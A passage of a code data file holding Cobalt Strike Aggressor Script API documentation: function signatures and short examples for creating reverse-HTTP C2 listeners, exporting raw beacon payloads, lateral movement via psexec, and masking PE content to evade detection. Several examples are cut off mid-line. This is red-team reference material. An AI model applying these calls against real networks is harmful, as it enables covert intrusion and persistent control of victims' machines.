listener_create("Beacon-HTTP", "windows/beacon_http/reverse_http",
"www.losenolove.com", 80, 
"www.losenolove.com, www2.losenolove.com");
\`\`\``,
    anchors: ["listener_create"],
  },
  "listener_create_ext": {
    name: "listener_create_ext",
    detail: "listener_create_ext($1, $2, $3)",
    documentation: `Create a new listener.

**Arguments:**
- \`$1\` — the listener name. Valid characters are alphabetic (a-z and A-Z), numeric (0-9), dash (-), period (.), and underscore (_). The name cannot start or end with a period (.).
- \`$2\` — the payload (e.g., windows/beacon_http/reverse_http)
- \`$3\` — a map with key/value pairs that specify options for the listener

**Note:** The guards value uses positional tab delimited syntax (\\t) to specify the IP Address, User Name, Server Name, and Domain guardrail settings. For example, if you want to only set the User Name and Server Name settings use the following key/value pair guards:

=> “\\tfoo*\\t*bar” 

In this case the firs

**Example:**
\`\`\`
# Create a simple HTTP listener, with guardrails
listener_create_ext("Beacon-HTTP", "windows/beacon_http/reverse_http",
%(host => "www.losenolove.com", port => 80,
beacons => www.losenolove.com,www2.losenolove.com,
guards => "198.178.*.*\\tfoo*\\t*bar\\t*love.com"));

# Create a detailed HTTPS listener
listener_create_ext("Beacon-HTTPS", "windows/beacon_https/reverse_https",
%(host => "stage.host", port => 443,
beacons => "b1.host,b2.host",
althost => "alt.host",
bindto => 8443,
profile => "default",
strategy => "failover-5x",
maxretry => "exit-10-5-5m",
proxy => "proxy.host"));

# Create a DNS l
\`\`\``,
    anchors: ["listener_create_ext"],
  },
  "listener_delete": {
    name: "listener_delete",
    detail: "listener_delete($1)",
    documentation: `Stop and remove a listener that is hosted on the active team server.

**Arguments:**
- \`$1\` — the listener name

**Example:**
\`\`\`
listener_delete("Beacon-HTTP");
\`\`\``,
    anchors: ["listener_delete"],
  },
  "listener_describe": {
    name: "listener_describe",
    detail: "listener_describe($1, $2)",
    documentation: `Describe a listener.

**Arguments:**
- \`$1\` — the listener name
- \`$2\` — (optional) the remote target the listener is destined for

**Returns:** A string describing the listener

**Example:**
\`\`\`
foreach $name (listeners()) {
println("$name is: " . listener_describe($name));
}
\`\`\``,
    anchors: ["listener_describe"],
  },
  "listener_info": {
    name: "listener_info",
    detail: "listener_info($1, $2)",
    documentation: `Get information about a listener.

**Arguments:**
- \`$1\` — the listener name
- \`$2\` — (optional) the key to extract a value for

**Returns:** %info = listener_info("listener-name");

Returns a dictionary with the metadata for this listener.

$value = listener_info("listener-name", "key");

Returns the value for the specified key from this listener's metadata

**Example:**
\`\`\`
# create a script console alias to dump listener info
command dump {
println("Listener $1");
foreach $key => $value (listener_info($1)) {
println("$[15]key $value");
}
}
\`\`\``,
    anchors: ["listener_info"],
  },
  "listener_pivot_create": {
    name: "listener_pivot_create",
    detail: "listener_pivot_create($1, $2, $3, $4, $5)",
    documentation: `Create a new pivot listener.

**Arguments:**
- \`$1\` — the Beacon ID
- \`$2\` — the listener name. Valid characters are alphabetic (a-z and A-Z), numeric (0-9), dash (-), period (.), and underscore (_). The name cannot start or end with a period (.).
- \`$3\` — the payload (e.g., windows/beacon_reverse_tcp)
- \`$4\` — the listener host
- \`$5\` — the listener port

**Note:** The only valid payload argument is windows/beacon_reverse_tcp.

**Example:**
\`\`\`
# create a pivot listener: 
# $1 = beaconID, $2 = name, $3 = port
alias plisten {
local('$lhost $bid $name $port');

# extract our arguments
($bid, $name, $port) = @_;

# get the name of our target
$lhost = beacon_info($1, "computer");

btask($1, "create TCP listener on $lhost $+ : $+ $port");
listener_pivot_create($1, $name, "windows/beacon_reverse_tcp", $lhost, $port);
}
\`\`\``,
    anchors: ["listener_pivot_create"],
  },
  "listener_restart": {
    name: "listener_restart",
    detail: "listener_restart($1)",
    documentation: `Restart a listener that is hosted on the active team server.

**Arguments:**
- \`$1\` — the listener name

**Example:**
\`\`\`
listener_restart("Beacon-HTTP");
\`\`\``,
    anchors: ["listener_restart"],
  },
  "listeners": {
    name: "listeners",
    detail: "Return a list of listener names (with stagers only",
    documentation: `Return a list of listener names (with stagers only!) across all team servers this client is connected to.

**Returns:** An array of listener names.

**Example:**
\`\`\`
printAll(listeners());
\`\`\``,
    anchors: ["listeners"],
  },
  "listeners_local": {
    name: "listeners_local",
    detail: "Return a list of listener names",
    documentation: `Return a list of listener names. This function limits itself to the active team server only. External C2 listener names are omitted.

**Returns:** An array of listener names.

**Example:**
\`\`\`
printAll(listeners_local());
\`\`\``,
    anchors: ["listeners_local"],
  },
  "listeners_stageless": {
    name: "listeners_stageless",
    detail: "Return a list of listener names across all team servers this client is connected...",
    documentation: `Return a list of listener names across all team servers this client is connected to. SMB and TCP listeners are filtered except for those hosted on the active team server. External C2 listeners are filtered as they are not actionable via staging or exporting as a Reflective DLL.

**Returns:** An array of listener names.

**Example:**
\`\`\`
printAll(listeners_stageless());
\`\`\``,
    anchors: ["listeners_stageless"],
  },
  "localip": {
    name: "localip",
    detail: "Get the IP address associated with the team server",
    documentation: `Get the IP address associated with the team server.

**Returns:** A string with the team server's IP address.

**Example:**
\`\`\`
println("I am: " . localip());
\`\`\``,
    anchors: ["localip"],
  },
  "menubar": {
    name: "menubar",
    detail: "menubar($1, $2)",
    documentation: `Add a top-level item to the menubar.

**Arguments:**
- \`$1\` — the description
- \`$2\` — the popup hook

**Example:**
\`\`\`
popup mythings {
item "Keep out" {
}
}

menubar("My &Things", "mythings");
\`\`\``,
    anchors: ["menubar"],
  },
  "mynick": {
    name: "mynick",
    detail: "Get the nickname associated with the current Cobalt Strike client",
    documentation: `Get the nickname associated with the current Cobalt Strike client.

**Returns:** A string with your nickname.

**Example:**
\`\`\`
println("I am: " . mynick());
\`\`\``,
    anchors: ["mynick"],
  },
  "nextTab": {
    name: "nextTab",
    detail: "Activate the tab that is to the right of the current tab",
    documentation: `Activate the tab that is to the right of the current tab.

**Example:**
\`\`\`
bind Ctrl+Right {
nextTab();
}
\`\`\``,
    anchors: ["nextTab"],
  },
  "on": {
    name: "on",
    detail: "on($1, $2)",
    documentation: `Register an event handler. This is an alternate to the on keyword.

**Arguments:**
- \`$1\` — the name of the event to respond to
- \`$2\` — a callback function. Called when the event happens.

**Example:**
\`\`\`
sub foo {
blog($1, "Foo!");
}

on("beacon_initial", &foo);
\`\`\``,
    anchors: ["on"],
  },
  "openAboutDialog": {
    name: "openAboutDialog",
    detail: "Open the \"About Cobalt Strike\" dialog",
    documentation: `Open the "About Cobalt Strike" dialog

**Example:**
\`\`\`
openAboutDialog();
\`\`\``,
    anchors: ["openAboutDialog"],
  },
  "openApplicationManager": {
    name: "openApplicationManager",
    detail: "Open the application manager (system profiler results) tab",
    documentation: `Open the application manager (system profiler results) tab.

**Example:**
\`\`\`
openApplicationManager();
\`\`\``,
    anchors: ["openApplicationManager"],
  },
  "openAutoRunDialog": {
    name: "openAutoRunDialog",
    detail: "Open the auto run dialog",
    documentation: `Open the auto run dialog.

**Example:**
\`\`\`
openAutoRunDialog();
\`\`\``,
    anchors: ["openAutoRunDialog"],
  },
  "openBeaconBrowser": {
    name: "openBeaconBrowser",
    detail: "Open the beacon browser tab",
    documentation: `Open the beacon browser tab.

**Example:**
\`\`\`
openBeaconBrowser();
\`\`\``,
    anchors: ["openBeaconBrowser"],
  },
  "openBeaconConsole": {
    name: "openBeaconConsole",
    detail: "openBeaconConsole($1)",
    documentation: `Open the console to interact with a Beacon

**Arguments:**
- \`$1\` — the Beacon ID to apply this feature to

**Example:**
\`\`\`
item "Interact" {
local('$bid');
foreach $bid ($1) {
openBeaconConsole($bid);
}
}
\`\`\``,
    anchors: ["openBeaconConsole"],
  },
  "openBrowserPivotSetup": {
    name: "openBrowserPivotSetup",
    detail: "openBrowserPivotSetup($1)",
    documentation: `open the browser pivot setup dialog

**Arguments:**
- \`$1\` — the Beacon ID to apply this feature to

**Example:**
\`\`\`
item "Browser Pivoting" {
local('$bid');
foreach $bid ($1) {
openBrowserPivotSetup($bid);
}
}
\`\`\``,
    anchors: ["openBrowserPivotSetup"],
  },
  "openBypassUACDialog": {
    name: "openBypassUACDialog",
    detail: "REMOVED Removed in Cobalt Strike 4",
    documentation: `REMOVED Removed in Cobalt Strike 4.1.`,
    anchors: ["openBypassUACDialog"],
  },
  "openCloneSiteDialog": {
    name: "openCloneSiteDialog",
    detail: "Open the dialog for the website clone tool",
    documentation: `Open the dialog for the website clone tool.

**Example:**
\`\`\`
openCloneSiteDialog();
\`\`\``,
    anchors: ["openCloneSiteDialog"],
  },
  "openConnectDialog": {
    name: "openConnectDialog",
    detail: "Open the connect dialog",
    documentation: `Open the connect dialog.

**Example:**
\`\`\`
openConnectDialog();
\`\`\``,
    anchors: ["openConnectDialog"],
  },
  "openCovertVPNSetup": {
    name: "openCovertVPNSetup",
    detail: "openCovertVPNSetup($1)",
    documentation: `open the Covert VPN setup dialog

**Arguments:**
- \`$1\` — the Beacon ID to apply this feature to

**Example:**
\`\`\`
item "VPN Pivoting" {
local('$bid');
foreach $bid ($1) {
openCovertVPNSetup($bid);
}
}
\`\`\``,
    anchors: ["openCovertVPNSetup"],
  },
  "openCredentialManager": {
    name: "openCredentialManager",
    detail: "Open the credential manager tab",
    documentation: `Open the credential manager tab.

**Example:**
\`\`\`
openCredentialManager();
\`\`\``,
    anchors: ["openCredentialManager"],
  },
  "openDefaultShortcutsDialog": {
    name: "openDefaultShortcutsDialog",
    detail: "Open the Default Keyboard Shortcuts dialog",
    documentation: `Open the Default Keyboard Shortcuts dialog. This function does not have any parameters.`,
    anchors: ["openDefaultShortcutsDialog"],
  },
  "openDownloadBrowser": {
    name: "openDownloadBrowser",
    detail: "Open the download browser tab",
    documentation: `Open the download browser tab

**Example:**
\`\`\`
openDownloadBrowser();
\`\`\``,
    anchors: ["openDownloadBrowser"],
  },
  "openElevateDialog": {
    name: "openElevateDialog",
    detail: "openElevateDialog($1)",
    documentation: `Open the dialog to launch a privilege escalation exploit.

**Arguments:**
- \`$1\` — the beacon ID

**Example:**
\`\`\`
item "Elevate" {
local('$bid');
foreach $bid ($1) {
openElevateDialog($bid);
}
}
\`\`\``,
    anchors: ["openElevateDialog"],
  },
  "openEventLog": {
    name: "openEventLog",
    detail: "Open the event log",
    documentation: `Open the event log.

**Example:**
\`\`\`
# Example using the dispatch_event aggressor script function
on ready {
# Send the script console tab to the bottom of the cobalt strike window
dispatch_event({
$client = getAggressorClient();
$tabMgr = [$client getTabManager];
$console = openEventLog();
[$tabMgr dockAppTab: $console];
});
}
\`\`\``,
    anchors: ["openEventLog"],
  },
  "openFileBrowser": {
    name: "openFileBrowser",
    detail: "openFileBrowser($1)",
    documentation: `Open the file browser for a Beacon

**Arguments:**
- \`$1\` — the Beacon ID to apply this feature to

**Example:**
\`\`\`
item "Browse Files" {
local('$bid');
foreach $bid ($1) {
openFileBrowser($bid);
}
}
\`\`\``,
    anchors: ["openFileBrowser"],
  },
  "openGoldenTicketDialog": {
    name: "openGoldenTicketDialog",
    detail: "openGoldenTicketDialog($1)",
    documentation: `open a dialog to help generate a golden ticket

**Arguments:**
- \`$1\` — the Beacon ID to apply this feature to

**Example:**
\`\`\`
item "Golden Ticket" {
local('$bid');
foreach $bid ($1) {
openGoldenTicketDialog($bid);
}
}
\`\`\``,
    anchors: ["openGoldenTicketDialog"],
  },
  "openHTMLApplicationDialog": {
    name: "openHTMLApplicationDialog",
    detail: "Open the HTML Application Dialog",
    documentation: `Open the HTML Application Dialog.

**Example:**
\`\`\`
openHTMLApplicationDialog();
\`\`\``,
    anchors: ["openHTMLApplicationDialog"],
  },
  "openHostFileDialog": {
    name: "openHostFileDialog",
    detail: "Open the host file dialog",
    documentation: `Open the host file dialog.

**Example:**
\`\`\`
openHostFileDialog();
\`\`\``,
    anchors: ["openHostFileDialog"],
  },
  "openInterfaceManager": {
    name: "openInterfaceManager",
    detail: "Open the tab to manage Covert VPN interfaces",
    documentation: `Open the tab to manage Covert VPN interfaces

**Example:**
\`\`\`
openInterfaceManager();
\`\`\``,
    anchors: ["openInterfaceManager"],
  },
  "openJavaSignedAppletDialog": {
    name: "openJavaSignedAppletDialog",
    detail: "Open the Java Signed Applet dialog",
    documentation: `Open the Java Signed Applet dialog

**Example:**
\`\`\`
openJavaSignedAppletDialog();
\`\`\``,
    anchors: ["openJavaSignedAppletDialog"],
  },
  "openJavaSmartAppletDialog": {
    name: "openJavaSmartAppletDialog",
    detail: "Open the Java Smart Applet dialog",
    documentation: `Open the Java Smart Applet dialog

**Example:**
\`\`\`
openJavaSmartAppletDialog();
\`\`\``,
    anchors: ["openJavaSmartAppletDialog"],
  },
  "openJobBrowser": {
    name: "openJobBrowser",
    detail: "openJobBrowser($1)",
    documentation: `Open the job browser tab.

**Arguments:**
- \`$1\` — the array of bids.

**Example:**
\`\`\`
openJobBrowser(@($bid)) # open job browser for one Beacon
openJobBrowser(@($bid1, $bid2)) # open job browser for multiple Beacon
openJobBrowser() # open job browser for all beacons
\`\`\``,
    anchors: ["openJobBrowser"],
  },
  "openJobConsole": {
    name: "openJobConsole",
    detail: "openJobConsole($1, $2)",
    documentation: `Open the console to the job output.

**Arguments:**
- \`$1\` — the Beacon id.
- \`$2\` — the Job id.`,
    anchors: ["openJobConsole"],
  },
  "openJumpDialog": {
    name: "openJumpDialog",
    detail: "openJumpDialog($1, $2)",
    documentation: `Open Cobalt Strike's lateral movement dialog

**Arguments:**
- \`$1\` — the type of lateral movement. See &beacon_remote_exploits for a list of options. ssh and ssh-key are options too.
- \`$2\` — an array of targets to apply this action against

**Example:**
\`\`\`
openJumpDialog("psexec_psh", @("192.168.1.3", "192.168.1.4"));
\`\`\``,
    anchors: ["openJumpDialog"],
  },
  "openKeystrokeBrowser": {
    name: "openKeystrokeBrowser",
    detail: "Open the keystroke browser tab",
    documentation: `Open the keystroke browser tab

**Example:**
\`\`\`
openKeystrokeBrowser();
\`\`\``,
    anchors: ["openKeystrokeBrowser"],
  },
  "openListenerManager": {
    name: "openListenerManager",
    detail: "Open the listener manager",
    documentation: `Open the listener manager

**Example:**
\`\`\`
openListenerManager();
\`\`\``,
    anchors: ["openListenerManager"],
  },
  "openMakeTokenDialog": {
    name: "openMakeTokenDialog",
    detail: "openMakeTokenDialog($1)",
    documentation: `Open a dialog to help generate an access token.

**Arguments:**
- \`$1\` — the Beacon ID to apply this feature to

**Example:**
\`\`\`
item "Make Token" {
local('$bid');
foreach $bid ($1) {
openMakeTokenDialog($bid);
}
}
\`\`\``,
    anchors: ["openMakeTokenDialog"],
  },
  "openMalleableProfileDialog": {
    name: "openMalleableProfileDialog",
    detail: "Open the malleable C2 profile dialog",
    documentation: `Open the malleable C2 profile dialog.

**Example:**
\`\`\`
openMalleableProfileDialog();
\`\`\``,
    anchors: ["openMalleableProfileDialog"],
  },
  "openOfficeMacro": {
    name: "openOfficeMacro",
    detail: "Open the office macro export dialog",
    documentation: `Open the office macro export dialog

**Example:**
\`\`\`
openOfficeMacroDialog();
\`\`\``,
    anchors: ["openOfficeMacro"],
  },
  "openOneLinerDialog": {
    name: "openOneLinerDialog",
    detail: "openOneLinerDialog($1)",
    documentation: `Open the dialog to generate a PowerShell one-liner for this specific Beacon session.

**Arguments:**
- \`$1\` — the beacon ID

**Example:**
\`\`\`
item "&One-liner" {
openOneLinerDialog($1);
}
\`\`\``,
    anchors: ["openOneLinerDialog"],
  },
  "openOrActivate": {
    name: "openOrActivate",
    detail: "openOrActivate($1)",
    documentation: `If a Beacon console exists, make it active. If a Beacon console does not exist, open it.

**Arguments:**
- \`$1\` — the Beacon ID

**Example:**
\`\`\`
item "&Activate" {
local('$bid');
foreach $bid ($1) {
openOrActivate($bid);
}
}
\`\`\``,
    anchors: ["openOrActivate"],
  },
  "openPayloadGeneratorDialog": {
    name: "openPayloadGeneratorDialog",
    detail: "Open the Payload Generator dialog",
    documentation: `Open the Payload Generator dialog.

**Example:**
\`\`\`
openPayloadGeneratorDialog();
\`\`\``,
    anchors: ["openPayloadGeneratorDialog"],
  },
  "openPayloadGeneratorStageDialog": {
    name: "openPayloadGeneratorStageDialog",
    detail: "Open the Payload Generator Stageless dialog",
    documentation: `Open the Payload Generator Stageless dialog.

**Example:**
\`\`\`
openPayloadGeneratorStageDialog();
\`\`\``,
    anchors: ["openPayloadGeneratorStageDialog"],
  },
  "openPayloadHelper": {
    name: "openPayloadHelper",
    detail: "openPayloadHelper($1)",
    documentation: `Open a payload chooser dialog.

**Arguments:**
- \`$1\` — a callback function. Arguments: $1 - the selected listener.

**Example:**
\`\`\`
openPayloadHelper(lambda({
bspawn($bid, $1);
}, $bid => $1));
\`\`\``,
    anchors: ["openPayloadHelper"],
  },
  "openPivotListenerSetup": {
    name: "openPivotListenerSetup",
    detail: "openPivotListenerSetup($1)",
    documentation: `open the pivot listener setup dialog

**Arguments:**
- \`$1\` — the Beacon ID to apply this feature to

**Example:**
\`\`\`
item "Listener..." {
local('$bid');
foreach $bid ($1) {
openPivotListenerSetup($bid);
}
}
\`\`\``,
    anchors: ["openPivotListenerSetup"],
  },
  "openPortScanner": {
    name: "openPortScanner",
    detail: "openPortScanner($1)",
    documentation: `Open the port scanner dialog

**Arguments:**
- \`$1\` — an array of targets to scan

**Example:**
\`\`\`
openPortScanner(@("192.168.1.3"));
\`\`\``,
    anchors: ["openPortScanner"],
  },
  "openPortScannerLocal": {
    name: "openPortScannerLocal",
    detail: "openPortScannerLocal($1)",
    documentation: `Open the port scanner dialog with options to target a Beacon's local network

**Arguments:**
- \`$1\` — the beacon to target with this feature

**Example:**
\`\`\`
item "Scan" {
local('$bid');
foreach $bid ($1) {
openPortScannerLocal($bid);
}
}
\`\`\``,
    anchors: ["openPortScannerLocal"],
  },
  "openPowerShellWebDialog": {
    name: "openPowerShellWebDialog",
    detail: "Open the dialog to setup the PowerShell Web Delivery Attack",
    documentation: `Open the dialog to setup the PowerShell Web Delivery Attack

**Example:**
\`\`\`
openPowerShellWebDialog();
\`\`\``,
    anchors: ["openPowerShellWebDialog"],
  },
  "openPreferencesDialog": {
    name: "openPreferencesDialog",
    detail: "Open the preferences dialog",
    documentation: `Open the preferences dialog

**Example:**
\`\`\`
openPreferencesDialog();
\`\`\``,
    anchors: ["openPreferencesDialog"],
  },
  "openProcessBrowser": {
    name: "openProcessBrowser",
    detail: "openProcessBrowser($1)",
    documentation: `Open a process browser for one or more Beacons

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
item "Processes" {
openProcessBrowser($1);
}
\`\`\``,
    anchors: ["openProcessBrowser"],
  },
  "openSOCKSBrowser": {
    name: "openSOCKSBrowser",
    detail: "Open the tab to list SOCKS proxy servers",
    documentation: `Open the tab to list SOCKS proxy servers

**Example:**
\`\`\`
openSOCKSBrowser();
\`\`\``,
    anchors: ["openSOCKSBrowser"],
  },
  "openSOCKSSetup": {
    name: "openSOCKSSetup",
    detail: "openSOCKSSetup($1)",
    documentation: `open the SOCKS proxy server setup dialog

**Arguments:**
- \`$1\` — the Beacon ID to apply this feature to

**Example:**
\`\`\`
item "SOCKS Server" {
local('$bid');
foreach $bid ($1) {
openSOCKSSetup($bid);
}
}
\`\`\``,
    anchors: ["openSOCKSSetup"],
  },
  "openScreenshotBrowser": {
    name: "openScreenshotBrowser",
    detail: "Open the screenshot browser tab",
    documentation: `Open the screenshot browser tab

**Example:**
\`\`\`
openScreenshotBrowser();
\`\`\``,
    anchors: ["openScreenshotBrowser"],
  },
  "openScriptConsole": {
    name: "openScriptConsole",
    detail: "Open the Aggressor Script console",
    documentation: `Open the Aggressor Script console.

**Example:**
\`\`\`
# Example using the dispatch_event aggressor script function
on ready {
# Send the script console tab to the bottom of the cobalt strike window
dispatch_event({
$client = getAggressorClient();
$tabMgr = [$client getTabManager];
$console = openScriptConsole();
[$tabMgr dockAppTab: $console];
});
}
\`\`\``,
    anchors: ["openScriptConsole"],
  },
  "openScriptManager": {
    name: "openScriptManager",
    detail: "Open the tab for the script manager",
    documentation: `Open the tab for the script manager.

**Example:**
\`\`\`
openScriptManager();
\`\`\``,
    anchors: ["openScriptManager"],
  },
  "openScriptedWebDialog": {
    name: "openScriptedWebDialog",
    detail: "Open the dialog to setup a Scripted Web Delivery Attack",
    documentation: `Open the dialog to setup a Scripted Web Delivery Attack

**Example:**
\`\`\`
openScriptedWebDialog();
\`\`\``,
    anchors: ["openScriptedWebDialog"],
  },
  "openServiceBrowser": {
    name: "openServiceBrowser",
    detail: "openServiceBrowser($1)",
    documentation: `Open service browser tab.

**Arguments:**
- \`$1\` — an array of targets to show services for

**Example:**
\`\`\`
openServiceBrowser(@("192.168.1.3"));
\`\`\``,
    anchors: ["openServiceBrowser"],
  },
  "openSiteManager": {
    name: "openSiteManager",
    detail: "Open the site manager",
    documentation: `Open the site manager.

**Example:**
\`\`\`
openSiteManager();
\`\`\``,
    anchors: ["openSiteManager"],
  },
  "openSpawnAsDialog": {
    name: "openSpawnAsDialog",
    detail: "openSpawnAsDialog($1)",
    documentation: `Open dialog to spawn a payload as another user

**Arguments:**
- \`$1\` — the Beacon ID to apply this feature to

**Example:**
\`\`\`
item "Spawn As..." {
local('$bid');
foreach $bid ($1) {
openSpawnAsDialog($bid);
}
}
\`\`\``,
    anchors: ["openSpawnAsDialog"],
  },
  "openSpawnDialog": {
    name: "openSpawnDialog",
    detail: "openSpawnDialog($1)",
    documentation: `Open dialog to spawn a payload.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
item "&Spawn" {
openSpawnDialog($1);
}
\`\`\``,
    anchors: ["openSpawnDialog"],
  },
  "openSpearPhishDialog": {
    name: "openSpearPhishDialog",
    detail: "Open the dialog for the spear phishing tool",
    documentation: `Open the dialog for the spear phishing tool.

**Example:**
\`\`\`
openSpearPhishDialog();
\`\`\``,
    anchors: ["openSpearPhishDialog"],
  },
  "openSystemInformationDialog": {
    name: "openSystemInformationDialog",
    detail: "Open the system information dialog",
    documentation: `Open the system information dialog.

**Example:**
\`\`\`
openSystemInformationDialog();
\`\`\``,
    anchors: ["openSystemInformationDialog"],
  },
  "openSystemProfilerDialog": {
    name: "openSystemProfilerDialog",
    detail: "Open the dialog to setup the system profiler",
    documentation: `Open the dialog to setup the system profiler.

**Example:**
\`\`\`
openSystemProfilerDialog();
\`\`\``,
    anchors: ["openSystemProfilerDialog"],
  },
  "openTargetBrowser": {
    name: "openTargetBrowser",
    detail: "Open the targets browser",
    documentation: `Open the targets browser

**Example:**
\`\`\`
openTargetBrowser();
\`\`\``,
    anchors: ["openTargetBrowser"],
  },
  "openWebLog": {
    name: "openWebLog",
    detail: "Open the web log tab",
    documentation: `Open the web log tab.

**Example:**
\`\`\`
# Example using the dispatch_event aggressor script function
on ready {
# Send the script console tab to the bottom of the cobalt strike window
dispatch_event({
$client = getAggressorClient();
$tabMgr = [$client getTabManager];
$console = openWebLog();
[$tabMgr dockAppTab: $console];
});
}
\`\`\``,
    anchors: ["openWebLog"],
  },
  "openWindowsDropperDialog": {
    name: "openWindowsDropperDialog",
    detail: "REMOVED Removed in Cobalt Strike 4",
    documentation: `REMOVED Removed in Cobalt Strike 4.0.`,
    anchors: ["openWindowsDropperDialog"],
  },
  "openWindowsExecutableDialog": {
    name: "openWindowsExecutableDialog",
    detail: "Open the dialog to generate a Windows executable",
    documentation: `Open the dialog to generate a Windows executable.

**Example:**
\`\`\`
openWindowsExecutableDialog();
\`\`\``,
    anchors: ["openWindowsExecutableDialog"],
  },
  "openWindowsExecutableStage": {
    name: "openWindowsExecutableStage",
    detail: "Open the dialog to generate a stageless Windows executable",
    documentation: `Open the dialog to generate a stageless Windows executable.

**Example:**
\`\`\`
openWindowsExecutableStageDialog();
\`\`\``,
    anchors: ["openWindowsExecutableStage"],
  },
  "openWindowsExecutableStageAllDialog": {
    name: "openWindowsExecutableStageAllDialog",
    detail: "Open the dialog to generate all of the stageless payloads (in x86 and x64) for a...",
    documentation: `Open the dialog to generate all of the stageless payloads (in x86 and x64) for all of the configured listeners. This dialog can also be found in the UI menu under Payloads -> Windows Stageless Generate all Payloads.

**Example:**
\`\`\`
openWindowsExecutableStageAllDialog();
\`\`\``,
    anchors: ["openWindowsExecutableStageAllDialog"],
  },
  "payload": {
    name: "payload",
    detail: "payload($1, $2, $3, $4, $5, $6)",
    documentation: `Exports a raw payload for a specific Cobalt Strike listener.

**Arguments:**
- \`$1\` — the listener name
- \`$2\` — x86|x64 the architecture of the payload
- \`$3\` — exit method: 'thread' (leave the thread when done) or 'process' (exit the process when done). Use 'thread' if injecting into an existing process.
- \`$4\` — A string value for the system call method. Valid values are:
- \`$5\` — (optional) The supporting HTTP library for generated beacons (wininet|winhttp|$null|blank string).
- \`$6\` — (optional) DNS Comm Mode Override. Use this to change the DNS Comm Mode from the default mode defined in Malleable C2 (dns|dns_over_https|$null|blank string).

**Returns:** A scalar containing position-independent code for the specified listener.

**Example:**
\`\`\`
$data = payload("my-listener", "x86", "process", "Direct");

$handle = openf(">out.bin");
writeb($handle, $data);
closef($handle);
\`\`\``,
    anchors: ["payload"],
  },
  "payload_bootstrap_hint": {
    name: "payload_bootstrap_hint",
    detail: "payload_bootstrap_hint($1, $2)",
    documentation: `Get the offset to function pointer hints used by Beacon's Reflective Loader. Populate these hints with the asked-for process addresses to have Beacon load itself into memory in a more OPSEC-safe way.

**Arguments:**
- \`$1\` — the payload position-independent code (specifically, Beacon)
- \`$2\` — the function to get the patch location for

**Returns:** The offset to a memory location to patch with a pointer for a specific function used by Beacon's Reflective Loader.

**Note:** - Cobalt Strike's Beacon has a protocol to accept artifact-provided function pointers for functions required by Beacon's Reflective Loader. The protocol is to patch the location of GetProcAddress and GetModuleHandleA into the Beacon DLL. Use of this protocol allows Beacon to load itself in memory wi`,
    anchors: ["payload_bootstrap_hint"],
  },
  "payload_local": {
    name: "payload_local",
    detail: "payload_local($1, $2, $3, $4, $5, $6)",
    documentation: `Exports a raw payload for a specific Cobalt Strike listener. Use this function when you plan to spawn this payload from another Beacon session. Cobalt Strike will generate a payload that embeds key function pointers, needed to bootstrap the agent, taken from the parent session's metadata.

**Arguments:**
- \`$1\` — the parent Beacon session ID
- \`$2\` — the listener name
- \`$3\` — x86|x64 the architecture of the payload
- \`$4\` — exit method: 'thread' (leave the thread when done) or 'process' (exit the process when done). Use 'thread' if injecting into an existing process.
- \`$5\` — A string value for the system call method. Valid values are:
- \`$6\` — (optional) The supporting HTTP library for generated beacons (wininet|winhttp|$null|blank string).

**Returns:** A scalar containing position-independent code for the specified listener.

**Example:**
\`\`\`
$data = payload_local($bid, "my-listener", "x86", "process", "None");

$handle = openf(">out.bin");
writeb($handle, $data);
closef($handle);
\`\`\``,
    anchors: ["payload_local"],
  },
  "pe_insert_rich_header": {
    name: "pe_insert_rich_header",
    detail: "pe_insert_rich_header($1, $2)",
    documentation: `Insert rich header data into Beacon DLL Content. If there is existing rich header information, it will be replaced.

**Arguments:**
- \`$1\` — Beacon DLL content
- \`$2\` — Rich header

**Returns:** Updated DLL Content

**Note:** The rich header length should be on a 4 byte boundary for subsequent checksum calculations.

**Example:**
\`\`\`
# -------------------------------------
# Insert (replace) rich header
# -------------------------------------
$rich_header = "<your rich header info>";
$temp_dll = pe_insert_rich_header($temp_dll, $rich_header);
\`\`\``,
    anchors: ["pe_insert_rich_header"],
  },
  "pe_mask": {
    name: "pe_mask",
    detail: "pe_mask($1, $2, $3, $4)",
    documentation: `Mask data in the Beacon DLL Content based on position and length.

**Arguments:**
- \`$1\` — Beacon DLL content
- \`$2\` — Start location
- \`$3\` — Length to mask
- \`$4\` — Byte value mask key (int)

**Returns:** Updated DLL Content

**Example:**
\`\`\`
# ===========================================================================
# $1 = Beacon DLL content
# ===========================================================================
sub demo_pe_mask {

local('$temp_dll, $start, $length, $maskkey');
local('%pemap');
local('@loc_en, @val_en');

$temp_dll = $1;

# -------------------------------------
# Inspect the current DLL...
# -------------------------------------
%pemap = pedump($temp_dll);
@loc_en = values(%pemap, @("Export.Name."));
@val_en = values(%pemap, @("Export.Name."));

if (size(@val_en) != 1) {
warn("Unexpected size of export nam
\`\`\``,
    anchors: ["pe_mask"],
  },
  "pe_mask_section": {
    name: "pe_mask_section",
    detail: "pe_mask_section($1, $2, $3)",
    documentation: `Mask data in the Beacon DLL Content based on position and length.

**Arguments:**
- \`$1\` — Beacon DLL content
- \`$2\` — Section name
- \`$3\` — Byte value mask key (int)

**Returns:** Updated DLL Content

**Example:**
\`\`\`
# ===========================================================================
# $1 = Beacon DLL content
# ===========================================================================
sub demo_pe_mask_section {

local('$temp_dll, $section_name, $maskkey');
local('@loc_en, @val_en');

$temp_dll = $1;

# -------------------------------------
# Set parameters
# -------------------------------------
$section_name = ".text";
$maskkey = 23;

# -------------------------------------
# mask a section in a dll
# -------------------------------------
# warn("pe_mask_section(dll, " . $section_name . ", " . 
\`\`\``,
    anchors: ["pe_mask_section"],
  },
  "pe_mask_string": {
    name: "pe_mask_string",
    detail: "pe_mask_string($1, $2, $3)",
    documentation: `Mask a string in the Beacon DLL Content based on position.

**Arguments:**
- \`$1\` — Beacon DLL content
- \`$2\` — Start location
- \`$3\` — Byte value mask key (int)

**Returns:** Updated DLL Content

**Example:**
\`\`\`
# ===========================================================================
# $1 = Beacon DLL content
# ===========================================================================
sub demo_pe_mask_string {

local('$temp_dll, $location, $length, $maskkey');
local('%pemap');
local('@loc);

$temp_dll = $1;

# -------------------------------------
# Inspect the current DLL...
# -------------------------------------
%pemap = pedump($temp_dll);
@loc = values(%pemap, @("Sections.AddressOfName.0."));

if (size(@loc) != 1) {
warn("Unexpected size of section name location array: " . size(@loc));
} els
\`\`\``,
    anchors: ["pe_mask_string"],
  },
  "pe_patch_code": {
    name: "pe_patch_code",
    detail: "pe_patch_code($1, $2, $3)",
    documentation: `Patch code in the Beacon DLL Content based on find/replace in '.text' section'.

